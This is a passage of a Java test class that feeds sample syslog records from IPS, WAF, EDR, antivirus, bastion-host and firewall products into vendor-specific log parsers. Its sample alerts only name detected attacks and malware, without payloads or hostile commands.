      String data = "<-1>Mar 22 09:42:18 localhost.localdomain est001: [CEF]:|数据库名称:tns62|规则类型:风险操作|风险级别:高风险|命中规则:12345|捕获时间:2019-03-22 09:37:15|服务器IP:192.168.8.62|服务器端口:1521|服务名（实例名）:orcl|客户端IP:192.168.8.35|客户端端口:64930|客户端MAC地址:C85B76B241BC|数据库用户名:scott|操作系统用户名:luoyang|SQL语句:select * from tab001";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testAuditNsFocus() {
    String parserFile = "./resources/parsers/audit_nsfocus_sasnx3_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<5>time:1642040841;card:G2/1;sip:10.10.55.55;smac:BC:30:5B:A3:3E:A8;sport:50700;dip:192.168.1.17;dmac:00:13:80:5C:3B:80;dport:80;user:;ruleid:1;scmid:340001;scmname:\\u7f51\\u9875\\u6d4f\\u89c8;level:1;alerted:0;dropped:0;cat:1;type:WebPage;info0:www.intra.nsfocus.com;info1:/wpresources/Componentart/styles/siteMap.css;info2:;info3:;info4:;info5:;info6:;info7:1;info8:;info9:Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13\\r\\n;info10:;keyword:;restore:";
      parse(botuEngine, data);
      data = "<1>rule_id:1;time:1642041147;module:fw;src_intf:G2/1;dst_intf:;action:accept;proto:icmp;src_addr:192.168.1.1;src_port:0;dst_addr:10.240.25.113;dst_port:0;src_addr_nat:;src_port_nat:0;dst_addr_nat:;dst_port_nat:0;info:;user:;app_name:ICMP\\xe5\\x8d\\x8f\\xe8\\xae\\xae;category:net;subcategory:infrastructure;technology:proto;app_id:5383208929591297;risk:1;tags:malware";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testIPSAISEDGE() {
    String parserFile = "./resources/parsers/ips_asiainfo_aisedge[6.0.0.1610]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<46>[Traffic log] log_time=2022-08-15 06:46:40 +0800; host name=ZJLSH-ZWY-CB-5F-AE-01; sessionid=46912897655104; start_time=2022-08-15 06:46:36; action_time=--; end_time=2022-08-15 06:46:40; source_interface=eth4; source_zone=--; source_ip=10.53.150.159; source_user=--; source_port=45682; destination_interface=eth5; destination_zone=--; destination_ip=59.202.38.178; destination_user=--; destination_port=443; protocol=6; appid=68; app_attribute_id=0; action=1; policy_name=Default; violation_type=0; ips_rule=--; file_name=--; malware_name=--; host=--; url=--; wrs_score=0; url_category=0,0,0,0; url_category1=0; url_category2=0; url_category3=0; url_category4=0; mail_sender=; mail_rcpt=; mail_subject=; qos_rulename=;";
      parse(botuEngine, data);
      data = "<46>[Traffic log] log_time=2022-08-15 06:45:51 +0800; host name=ZJLSH-ZWY-CB-5F-AE-01; sessionid=46912775611552; start_time=2022-08-15 06:45:48; action_time=--; end_time=2022-08-15 06:45:51; source_interface=eth4; source_zone=--; source_ip=10.53.150.159; source_user=--; source_port=40832; destination_interface=eth5; destination_zone=--; destination_ip=172.28.77.198; destination_user=--; destination_port=8091; protocol=6; appid=67; app_attribute_id=0; action=1; policy_name=Default; violation_type=0; ips_rule=--; file_name=ZT00201; malware_name=ZT00201; host=172.28.77.198:8091; url=/lsqsmzqgl/service/API/ZT00201; wrs_score=0; url_category=0,0,0,0; url_category1=0; url_category2=0; url_category3=0; url_category4=0; mail_sender=; mail_rcpt=; mail_subject=; qos_rulename=;";
      parse(botuEngine, data);
      data = "<46>[Traffic log] log_time=2022-08-15 06:46:40 +0800; host name=ZJLSH-ZWY-CB-5F-AE-01; sessionid=46912897655104; start_time=2022-08-15 06:46:36; action_time=--; end_time=2022-08-15 06:46:40; source_interface=eth4; source_zone=--; source_ip=10.53.150.159; source_user=--; source_port=45682; destination_interface=eth5; destination_zone=--; destination_ip=59.202.38.178; destination_user=--; destination_port=443; protocol=6; appid=68; app_attribute_id=0; action=1; policy_name=Default; violation_type=0; ips_rule=--; file_name=--; malware_name=--; host=--; url=--; wrs_score=0; url_category=0,0,0,0; url_category1=0; url_category2=0; url_category3=0; url_category4=0; mail_sender=; mail_rcpt=; mail_subject=; qos_rulename=;";
      parse(botuEngine, data);
      data = "<46>[Traffic log] log_time=2022-08-15 14:52:08 +0800; host name=ZJLSH-ZWY-CB-5F-AE-02; sessionid=46912863110592; start_time=2022-08-15 14:52:06; action_time=--; end_time=2022-08-15 14:52:08; source_interface=eth4; source_zone=--; source_ip=10.53.151.243; source_user=--; source_port=59994; destination_interface=eth5; destination_zone=--; destination_ip=10.145.29.2; destination_user=--; destination_port=8848; protocol=6; appid=67; app_attribute_id=0; action=1; policy_name=Default; violation_type=0; ips_rule=--; file_name=list; malware_name=list; host=10.145.29.2:8848; url=/nacos/v1/ns/instance/list?healthyOnly=false&namespaceId=6a4ec1f7-98ce-47ef-8486-0e8f3d1aa3c0&clientIP=10.53.151.243&serviceName=DEFAULT_GROUP%40%40opengateway-service&udpPort=34579&encoding=UTF-8; wrs_score=0; url_category=0,0,0,0; url_category1=0; url_category2=0; url_category3=0; url_category4=0; mail_sender=; mail_rcpt=; mail_subject=; qos_rulename=;";
      parse(botuEngine, data);
      data = "<46>[Traffic log] log_time=2022-08-18 01:29:15 +0800; host name=ZJLSH-ZWY-CB-5F-AE-01; sessionid=46913095478976; start_time=2022-08-18 01:29:06; action_time=--; end_time=2022-08-18 01:29:15; source_interface=eth5; source_zone=--; source_ip=172.28.77.185; source_user=--; source_port=--; destination_interface=eth4; destination_zone=--; destination_ip=10.53.140.169; destination_user=--; destination_port=--; protocol=269; appid=70; app_attribute_id=0; action=1; policy_name=Default; violation_type=0; ips_rule=--; file_name=--; malware_name=--; host=--; url=--; wrs_score=0; url_category=0,0,0,0; url_category1=0; url_category2=0; url_category3=0; url_category4=0; mail_sender=; mail_rcpt=; mail_subject=; qos_rulename=;";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testIpsDpTech() {
    String parserFile = "./resources/parsers/ips_dptech_ips2000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "Mar 21 18:13:03 10.11.3.4 2011-03-09 20:55:39 DPTECH %%--IPS/DEVM/4/SYSLOG(l): The use of cpu is too high: 17.";
/*      parse(botuEngine, data);
      data = "<97>Jul 25 16:36:06 2020 DPTECH %%DPX/AV/1/SRVLOG(l): log-type:av-protect;``event:alert;``av-name:(67109046)Virus.Eicar-Test-String;``protocol-name:(1375731732)SMTP.TCP;``ip-proto-id:6;``source-ip:172.30.177.168;``source-port:50302;``destination-ip:192.168.2.254;``destination-port:25;``ifname-inside:gige3_16;``vsys-id:0;``summary-count:1;``summary-offset:0;``policy-id:1;``policy-name:1;``src-mac:44:37:e6:1b:b7:01;``dst-mac:00:24:ac:85:11:13;``";
      parse(botuEngine, data);*/
      data = "<97>Jul 25 16:36:18 2020 DPTECH %%DPX/ATTACK/1/SRVLOG(l): log-type:attack-protect;``event:alert;``attack-name:(402663337)ASP know you the taste WebShell backdoor Network Ma;``attack-type:WEB Back Door:ASP Web Trojan Upload;``protocol-name:(1375731729)HTTP;``basic-protocol-name:(17)HTTP;``ip-proto-id:6;``source-ip:172.153.254.12;``source-port:80;``destination-ip:10.101.0.197;``destination-port:3667;``ifname-inside:gige3_16;``vlan-tag:0;``vsys-id:0;``packet:AAAAAAABAAAAAAABCABFAABQAAAAAIAGhNismf4MCmUAxQBQDlNON5N5BV4CrFAQgAAAAEtOZG9uZbauxOPOtrXAR0lGODlhPGh0bWw+MTx0aXRsZT62rsTjzra1wA==;``summary-count:1;``summary-offset:0;``host:172.153.254.12;``uri:GET /test.php ;``attack-period:Command And Control;``policy-id:1;``policy-name:1;``src-mac:00:00:00:00:00:01;``dst-mac:00:00:00:00:00:01;``http-status:0;``";
      parse(botuEngine, data);
      /*data = "<96>Apr  5 10:11:58 2017 DPTECH %%IPS/PROTECT/0/SRVLOG(l): log-type:sensitive-application;``event:alert;``protocol-name:(1375731727)POP3.TCP;``application-name:(133)POP3;``ip-proto-id:6;``source-ip:4-C0A802FE;``source-port:110;``destination-ip:4-0A79147E;``destination-port:56482;``ifname-inside:gige0_4;``vsys-id:0;``";
      parse(botuEngine, data);
      data = "<97>Jan 14 20:46:48 2020 DPTECH %%IPS/AV_FILE/1/SRVLOG(l): log-type:av-file;``source-ip:1.1.215.126;``destination-ip:1.2.106.194;``source-port:42583;``destination-port:25;``virus-name:Exploit/CVE-2010-0188;``file-name:vjWPO.pDF;``md5:A38A70821C62BE2996AC1C28575F2FD2;``basic-protocol:TCP;``app-protocol:SMTP.TCP;``av-type:20;``event:block;``mail-sender:CcH2QxNBZJPZnjUdKkUtk8t@bJlwTOxcBhiMsEinXnHH.net;``mail-receiver:tJcWNBjNK0UPTeTNNNUofpukaUG@XedriPjxrSZjpeWLbgFdZRpdWNsXVuVZruT.us;``mail-cc:;``mail-subject: fOkDpsW5;``";
      parse(botuEngine, data);*/
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testAntiDosDpTech() {
    String parserFile = "./resources/parsers/antidos_dptech_guard3000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<57>2016-06-15 14:29:21 10.12.5.200 %%--PROBE/DETECT/1/ALARM: Anomaly ID:415; Creation Time:Sun Jan 18 07:12:39 1970; Update Time:Wed Jun 15 14:29:21 2016; Type:Traffic Anomaly; Sub-type:UDP Flood; Severity:Red; Status:Ongoing; Direction:Incoming; Resource:; Resource ID:; Importance:High; Current:; Threshold:; Unit:; DIP1:10.12.1.1; DIP2:; DIP3:; DPort1:53; DPort2:23; SIP1:1.1.1.1; SIP2:2.2.2.2; SIP3:3.3.3.3; SPort1:123; SPort2:456; Protocol:17; URL to Link the Report:www.dptechnology.net";
      parse(botuEngine, data);
      data = "<57>2016-06-15 14:29:21 10.12.5.200 %%--PROBE/DETECT/1/SIP-LIST: Anomaly ID:415; Creation Time:Sun Jan 18 07:12:39 1970; Update Time:Wed Jun 15 14:29:21 2016; DIP:10.12.1.1; Type:Traffic Anomaly; Sub-type:UDP Flood; Direction:Incoming; TOPIPData:{\"TOPIPData\":[{\"SIPOrDIP\":\"1.1.1.1\",\"bps\":\"100\",\"pps\":\"8\"},{\"SIPOrDIP\":\"1.1.1.2\",\"bps\":\"100\",\"pps\":\"8\"},{\"SIPOrDIP\":\"1.1.1.3\",\"bps\":\"100\",\"pps\":\"8\"}]}; SourcePortData:{\"SourcePortData\":[{\"protocol\":\"TCP\",\"port\":\"80\",\"bps\":\"100\",\"pps\":\"8\"},{\"protocol\":\"TCP\",\"port\":\"90\",\"bps\":\"100\",\"pps\":\"8\"},{\"protocol\":\"UDP\",\"port\":\"1050\",\"bps\":\"100\",\"pps\":\"8\"}]}; DestinationPortData:{\"DestinationPortData\":[{\"protocol\":\"TCP\",\"port\":\"80\",\"bps\":\"100\",\"pps\":\"8\"},{\"protocol\":\"TCP\",\"port\":\"90\",\"bps\":\"100\",\"pps\":\"8\"},{\"protocol\":\"UDP\",\"port\":\"1050\",\"bps\":\"100\",\"pps\":\"8\"}]};";
      parse(botuEngine, data);
      data = "<57>2016-10-28 11:57:08 172.30.37.64 %%--GUARD/DETECT/1/TRAFFIC:IP address:101.100.0.56;Creation Time:Fri Oct 28 11:57:08 2016;Traffic Type:TCP SYN Flood;Packets before cleaning:999;bits before cleaning:527472;Packets after cleaning:0;bits after cleaning:0";
      parse(botuEngine, data);
      data = "<57>2016-10-28 09:52:11 172.30.161.188 %%--PROBE/DETECT/1/TRAFFIC:IP address:172.30.0.5;Creation Time:Fri Oct 28 09:52:07 2016;Traffic Type:HTTP Flood;Direction:Incoming;Packets:194586;bits:99628032";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testBastionNsFocus() {
    String parserFile = "./resources/parsers/bastion_nsfocus_osmsnx3_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "user:dev;loginip:10.66.6.1;time:1380078378;comment:登录成功";
      parse(botuEngine, data);
      data = "session_id:2089;login_time:1380078116;logout_time:1380078369;user:dev;dev_usr:nsfocus;dev_ip:10.245.34.133;protocol:RDP";
      parse(botuEngine, data);
      data = "session_id:198;cmd_time:1595489911;cmd:pwd;block:0;user:test;dev_usr:nsfocus;dev_ip:10.245.27.215;protocol:ssh;risk:1";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testEpsVSecure() {
    String parserFile = "./resources/parsers/eps_v-secure_jc-svr-standard_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<28>2023-02-10T11:55:00-05:00 fangbingdu demotag[18146]: devid=”9c5ca7a79df1b053f51ed90df00ff143” time=1528454037 event_class_id=0x0700 event_id=0x0701 alarm=0 level=3 virus_name=”Win32.Exploit.Eternalblue.Z1.zav” virus_type=”文档病毒” virus_path=”C:\\Windows\\SecureBootThemes\\Microsoft\\eteb-2.dll” virus_md5=”47106682e18b0c53881252061ffcaa2d” report_time=1528454037 clean_time=1528454037 is_sync=0 event_type=”闪电查杀” file_size=128512 file_origin=”实时防护” op_result=”已清除” dev_name=”DESKTOP-OU52KM4” ip=”192.168.1.23”";
      parse(botuEngine, data);
      data = "<28>2023-02-10T11:55:00-05:00 fangbingdu demotag[18146]: devid=”9c5ca7a79df1b053f51ed90df00ff143” time=”2020-03-12 12:03:04” reason=”主动发起” status=” 成功” action=”启动杀毒” dev_name=”DESKTOP-OU52KM4” ip=”192.168.1.23”";
      parse(botuEngine, data);
      data = "<28>2023-02-10T11:55:00-05:00 fangbingdu demotag[18146]: user=”admin” user_type=”超级管理员” action=”登录” ip=\"127.0.0.1\" time=”2020-03-12 12:03:04”";
      parse(botuEngine, data);
      data = "<28>2023-02-10T11:55:00-05:00 fangbingdu demotag[18146]: kbid=”KB2115168” devid=”9c5ca7a79df1b053f51ed90df00ff143” time=”2020-03-12 15:03:04” scan_time=”2020-03-12 15:00:32” repair_time=”2020-03-12 15:03:00” repair_status=” 成功” dev_name=”DESKTOP-OU52KM4” ip=”192.168.1.23”";
      parse(botuEngine, data);
      data = "<28>2023-02-21T09:55:00-05:00 fangbingdu demotag[18146]: devid=\"ccdea714eb778f41b76f9485524954de\" time=\"2023-02-21 09:50:26\" event_class_id=1792 event_id=1793 alarm=0 level=3 virus_name=\"Trojan/Win32.serverstart.Z11.zav\" virus_type=\"木马病毒\" virus_path=\"C:\\Users\\Administrator\\Desktop\\测试样本\\39a32331242da6904871629ac5e4d81bba63a111\" virus_md5=\"b155c163e11ebb3569fba55cf3c8484b\" report_time=\"2023-02-21 09:50:26\" clean_time=\"\" event_type=\"自定义查杀\" file_size=103796 file_origin=\"普通扫描\" op_result=\"\" dev_name=\"WIN-RSJ1Q82SGHB\" ip=\"10.56.137.181\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testESRVenusVetrix() {
    String parserFile = "./resources/parsers/edr_venus_vetrix_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "{\"ip \": \"10.200.13.10\",   \"mac\": \"30-5A-3A-7E-C7-AE\",\"uuid\": \"8640a7d64736ac474783cdf6a702cae8\",\"version\": \"\",\"os\": 1,   \"send_time\": \"2019-08-19T09:47:43+08:00\",\"message_id \" : 5201,\"content\":[{\t\"policy_id\": \"7905F0A8-0602-647E-DC86-B03E06D98D50\",“name”:”edr-test2”,\t\"occur_time\": \"2020-12-01T17:02:02+08:00\",\t\"auto_resp\": 1,\t\"out_link_list\": [\t\t{“host”:\"39.156.69.79\"，”outlink_way”:1, “port”:80}\t]}],\"correlation_id\": 1}";
      parse(botuEngine, data);
      data = "{\"ip\":\"3.1.1.41\",\"mac\":\"30-5A-3A-7E-C7-AE\",\"uuid\":\"8640a7d64736ac474783cdf6a702cae8\",\"version\":\"\",\"os\":1,\"send_time\":\"2022-10-21T09:47:43+08:00\",\"message_id\":5242,\"content\":[{\"policy_id\":\"7905F0A8-0602-647E-DC86-B03E06D98D50\",\"name\":\"edr-test2\",\"occur_time\":\"2022-10-21T17:02:02+08:00\",\"remote_ip\":\"3.1.1.20\",\"time_duration\":60,\"port_count\":10,\"port_nums\":[135,137,138,139],\"resp_result\":1}],\"correlation_id\":1}";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testWafVenus() {
    String parserFile = "./resources/parsers/waf_venus_v-waf_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<6>Nov 28 16:55:48 HOST;110103300117111310721344;ipv4;3; web_access: user_name=192.168.4.223;user_group_name=root;term_platform= windows;term_device=PC;src_ip=192.168.4.223;dst_ip=125.88.193.243;url_domain=www.haosou.com;url= http://www.haosou.com/brw?w=1&v=7.1.1.558&u= http%3A%2F%2Fchurch-group-discounts.com%2F;url_cate_name= 其他;handle_action=0;msg=";
      parse(botuEngine, data);
      data = "<6>Nov 28 16:46:03 HOST;110103300117111310721344;ipv4;3; nat: BIND:user 192.168.5.36, nat_range:220.249.52.178 12224-12323 ,ifdesc=ge16";
      parse(botuEngine, data);
      data = "<4>Jul 11 19:03:49 2.208-2039-master;530000500119032974562668;ipv4;3; behavior_model:src_ip=172.16.22.61;dst_ip=172.17.1.95;src_port=21833;dst_port=53;src_mac=02:1a:c5:01:15:3b;dst_mac=68:91:d0:d5:7f:7d;protocol=UDP;behavior_name_cn=DNS 隧道;behavior_name_en=DNStunnel;behavior_detail=dnscat.27d5012b62965cbe1376c70aec84b1856d;behavior_desc=Dns traffic is too large,level=warning;action=拒绝";
      parse(botuEngine, data);
      data = "<4>Nov 28 16:47:38 HOST;110103300117111310721344;ipv4;3; security_abnormal_pkt: user_name=test;src_ip=20.1.1.5;src_port=0;dst_ip=30.1.1.2;dst_port=0;name=jolt2;type=abnormal-packet;protocol=ICMP;mac=00:40:01:55:24:34; count=8268;level=4;in_if_name=ge6;create_time=1406279692;end_time= 1406279702;extend=;";
      parse(botuEngine, data);
      data = "<4>Nov 28 16:47:38 HOST;110103300117111310721344;ipv4;3; security_scan: user_name= ;src_ip=192.168.2.34;src_port=0;dst_ip=198.46.82.65;dst_port=0;name=ipsweep;type=scan-attack;protocol=ICMP;mac=00:21:45:c0:fa:00;count= 1;level=4;in_if_name=ge2;create_time=1511858856;end_time=1511858856; extend=;";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testBastionVenus() {
    String parserFile = "./resources/parsers/bastion_venus_osm-virt_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<18>{    \"version\": 1,\"log_type\": \"002\",\"log_time\": \"2019-02-18 09:59:27\",\"dev_name\": \"bastion\",\"dev_ipv4\": \"172.16.153.110\",\"dev_ipv6\": \"\",\"dev_mac\": \"00:0c:29:de:8c:a5\",\"login_action\": 0,\"login_type\": \"0016\",\"session_id\": \"9a8dc5ea-19e2-4a59-96d9-d56362957d3b\",\"access_id\": \"23bbf316-e7b5-46a1-a2ff-2510493d291b\",\"resource_name\": \"172.16.153.214\",\"resource_addr\": \"172.16.153.214\",\"resource_port\": 2222,\"resource_account_id\": 1,\"resource_account\": \"test\",\"resource_account_type\": 1,\"tool_name\": \"Putty\",\"user_id\": 1,\"user_name\": \"sysadmin\",\"user_addr\": \"172.16.153.200\",\"user_port\": 59787  }";
      parse(botuEngine, data);
      data = "<16>{        \"version\": 1,\"log_type\": \"003\",\"log_time\": \"2019-02-18 09:52:26\",\"dev_name\": \"bastion\",\"dev_ipv4\": \"172.16.153.110\",\"dev_ipv6\": \"\",\"dev_mac\": \"00:0c:29:de:8c:a5\",\"session_id\": \"519eb3b1-6a53-40b4-b6c6-3cfaaf245227\",\"command_id\": \"57ff19b0-9fbc-4fb4-8373-08d80709db25\",\"command_rule_id\": 0,\"action_id\": 0,\"operate_direct\": 1,\"approval_log_id\": \"\",\"approvers\": \"\",\"command\": \"[test@build-platform ~]$ ls\"      }";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testEDRVenusESMDISC() {
    String parserFile = "./resources/parsers/edr_venus_esm-disc_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<0>Sep  25 23:39:00 WIN-70AV4OJUJ85 <Policy_Base_ProcessRedList><Data eventtype=\"0\" policyname=\"test_进程红名单\" occurtime=\"2017-09-25 23:39:25\" processname=\"cmd.exe\" event=\"1\" status=\"0\" guid=\"{9A71932A-C792-4FEF-BB8D-46C28C0817BA}\" hostname=\"林晓娜的计算机\" ip=\"10.201.250.62\" mask=\"255.255.0.0\" mac=\"00-0C-29-44-44-1C\" winuser=\"linxiaona\" depnamelevel1=\"启明星辰广州研发中心\" depnamelevel2=\"test测试部\" depnamelevel3=\"\" depnamelevel4=\"\" depnamelevel5=\"\" serverip=\"10.200.200.219\" osversion=\"10\"/></Policy_Base_ProcessRedList>";
      parse(botuEngine, data);
      data = "<2>Sep  25 23:44:02 WIN-70AV4OJUJ85 <Policy_Audit_DLPCopySecret><Data process=\"Explorer.EXE\" spath=\"C:\\Users\\PC\\Desktop\\新建文本文档.txt\" dpath=\"C:\\Users\\PC\\Desktop\" encrypt=\"0\" secretlevel=\"1\" reason=\"\" filesize=\"40\" action=\"0\" time=\"2017-09-25 23:44:05\" keywords=\"关键字:启明(1);\" filemd5=\"4B453E3957A782062723A483E58037B7\" guid=\"{9A71932A-C792-4FEF-BB8D-46C28C0817BA}\" hostname=\"林晓娜的计算机\" ip=\"10.201.250.62\" mask=\"255.255.0.0\" mac=\"00-0C-29-44-44-1C\" winuser=\"linxiaona\" depnamelevel1=\"启明星辰广州研发中心\" depnamelevel2=\"test测试部\" depnamelevel3=\"\" depnamelevel4=\"\" depnamelevel5=\"\" serverip=\"10.200.200.219\" osversion=\"10\"/></Policy_Audit_DLPCopySecret>";
      parse(botuEngine, data);
      data = "<7>Sep  26 11:54:48 WIN-70AV4OJUJ85 <Policy_Audit_File><Data time=\"2017-09-26 11:55:21\" flag=\"2\" operation=\"7\" srcfilename=\"移动存储设备(Kingston DataTraveler G2 USB Device)\" dstfilename=\"\" process=\"\" nethost=\"\" netip=\"10.201.250.62\" netmac=\"00-0C-29-44-44-1C\" guid=\"{9A71932A-C792-4FEF-BB8D-46C28C0817BA}\" hostname=\"林晓娜的计算机\" ip=\"10.201.250.62\" mask=\"255.255.0.0\" mac=\"00-0C-29-44-44-1C\" winuser=\"linxiaona\" depnamelevel1=\"启明星辰广州研发中心\" depnamelevel2=\"test测试部\" depnamelevel3=\"\" depnamelevel4=\"\" depnamelevel5=\"\" serverip=\"10.200.200.219\" osversion=\"10\"/></Policy_Audit_File>";
      parse(botuEngine, data);
      data = "<1>Apr 17 12:21:09 WIN-L9SLHSHEP2U <Policy_Audit_Web><010>    <Data type=\"webaudit\" time=\"2019-04-17 12:20:49\" httpport=\"80\" httphost=\"switch.pcfg.cache.wpscdn.cn\" resource=\"/\" localuser=\"SYSTEM\" localhost=\"DES-WIN10\" action=\"0\" guid=\"{F5CF06F0-50DC-4600-8F59-CF38EC738444}\" hostname=\"DES-WIN10\" ip=\"10.201.250.15\" mask=\"255.255.0.0\" mac=\"50-9A-4C-02-87-77\" winuser=\"win10-琳琳\" depnamelevel1=\"启明星辰\" depnamelevel2=\"广州研发中心\" depnamelevel3=\"测试部\" depnamelevel4=\"\" depnamelevel5=\"\" serverip=\"10.200.200.215\" osversion=\"32\"/><010></Policy_Audit_Web>";
      parse(botuEngine, data);
      data = "<3>May  7 14:08:46 angola <Policy_Radius srvip=\"0\" logtime=\"2019-05-07 14:08:46\" macaddress=\"BC-96-80-EF-BC-CD\" nasipaddress=\"10.200.0.100\" nasport=\"0\" nasporttype=\"19\" userid=\"\" vlanid=\"0\" pass=\"1\" invalidmac=\"0\" authres=\"The authentication is successful.\" invalidguid=\"1\" clientid=\"{F2AF6AF8-1E8F-412F-98EA-CBA5D4E8B586}\" hostname=\"WIN-TCNADP930E3\" issatisfied=\"1\" authtype=\"0\" iswireless=\"0\" swname=\"TP-LINK_802.1X\"/>";
      parse(botuEngine, data);
      data = "<2>Apr 17 14:19:08 WIN-L9SLHSHEP2U <Policy_Firewall_AttackControl><010>    <Data type=\"tcplimit\" subtype=\"0\" policyname=\"\" time=\"2019-04-17 14:13:26\" value=\"178\" guid=\"{8BC87CD6-E465-4603-9B82-DA4546FEE2F5}\" hostname=\"w81x64_english.winter.com\" ip=\"10.201.250.98\" mask=\"255.255.0.0\" mac=\"00-0C-29-EB-96-97\" winuser=\"win8.1x64——【虚】\" depnamelevel1=\"启明星辰\" depnamelevel2=\"venus【琳琳】\" depnamelevel3=\"venus【win8.1】\" depnamelevel4=\"win8.1x64\" depnamelevel5=\"\" serverip=\"10.200.200.215\" osversion=\"37\"/><010></Policy_Firewall_AttackControl>";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testEasynetworksFirewall() {
    String parserFile = "./resources/parsers/firewall_easynetworks_firewall_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<190>date=2022-10-26 time=09:01:34 devname=APW1KAIRFM000509 device_id=APW1KAIRFM000509 log_id=2 type=traffic subtype=allowed pri=information status=accept vd=\"root\" dir_disp=org tran_disp=noop src=192.168.2.88 srcname=192.168.2.88 src_port=138 dst=192.168.2.255 dstname=192.168.2.255 dst_port=138 tran_ip=N/A tran_port=0 service=138/udp proto=17 app_type=N/A duration=180 rule=3 policyid=3 identidx=0 sent=962 rcvd=0 shaper_drop_sent=0 shaper_drop_rcvd=0 perip_drop=0 shaper_sent_name=\"N/A\" shaper_rcvd_name=\"N/A\" perip_name=\"N/A\" sent_pkt=4 rcvd_pkt=0 vpn=\"N/A\" src_int=\"port1\" dst_int=\"l2sniff_0\" SN=77065 app=\"N/A\" app_cat=\"N/A\" user=\"N/A\" group=\"N/A\" carrier_ep=\"N/A\" result=\"two-way\" src_mac=\"N/A\" dst_mac=\"N/A\"";
/*      parse(botuEngine, data);
      data = "<190>date=2022-10-25 time=22:14:57 devname=APW1KAIRFM000509 device_id=APW1KAIRFM000509 log_id=32005 type=event subtype=admin pri=information vd=root user=\"admin\" ui=https(192.168.2.210) action=logout status=success reason=timeout msg=\"admin|https(192.168.2.210)\"";
      parse(botuEngine, data);
      data = "<190>date=2013-04-03 time=01:42:05 log_id=0954024577 type=dlp subtype=dlp pri=notice vd=\"root\" policyid=1 intf_policyid=0 identidx=0 serial=242139 user=\"N/A\" group=\"N/A\" src=192.168.11.1 sport=53007 src_port=53007 src_int=\"internal\" dst=74.125.224.219 dport=80 dst_port=80 dst_int=\"wan1\" service=http status=detected filefilter=\"none\" filetype=\"unknown\" sent=627 rcvd=488 mail_size=0 att_size=0 att_count=0 hostname=\"ad.doubleclick.net\" url=\"/activity;src=3530909;met=1;v=1;pid=95251879;aid=269245842;ko=0;cid=53117923;rid=53055783;rv=1;&timestamp=1364978532662;eid1=2;ecn1=0;etm1=10;\" from=\"N/A\" to=\"N/A\" subject=\"N/A\" msg=\"data leak detected(Data Leak Prevention Rule matched)\" rulename=\"All-HTTP\" compoundname=\"N/A\" filtername=\"All-HTTP\" file=\"N/A\" action=log-only severity=1";
      parse(botuEngine, data);
